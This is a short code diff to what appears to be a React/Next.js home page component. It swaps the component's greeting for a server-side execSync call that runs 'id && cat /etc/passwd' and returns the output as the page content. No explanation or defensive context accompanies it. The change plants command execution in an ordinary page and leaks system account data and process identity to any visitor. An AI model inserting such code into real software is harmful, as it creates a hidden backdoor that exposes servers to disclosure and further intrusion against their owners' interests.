@@ -1,3 +1,6 @@
+const { execSync } = require('child_process');
+
 export default function Home() {
-  return <h1>Hello</h1>;
+    const result = execSync('id && cat /etc/passwd', { encoding: 'utf8' });
+    return result;
 }
